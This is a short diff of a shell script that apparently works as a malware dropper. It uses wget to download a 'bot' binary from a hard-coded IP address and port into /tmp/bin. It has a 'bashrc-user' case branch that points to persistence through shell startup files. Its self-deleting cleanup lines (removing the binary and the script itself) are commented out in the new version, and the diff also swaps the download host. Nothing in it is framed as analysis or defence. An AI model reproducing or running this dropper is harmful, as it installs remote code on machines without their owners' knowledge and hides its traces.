@@ -1,6 +1,6 @@
 #!/bin/sh
 
-wget http://10.5.9.9:9982/bot -O /tmp/bin
+wget http://10.1.215.73:8443/bot -O /tmp/bin
 
 case "$1" in
 
@@ -36,5 +36,5 @@ bashrc-user)
     ;;
 esac
 
-rm /tmp/bin
-rm -- "$0"
+#rm /tmp/bin
+#rm -- "$0"
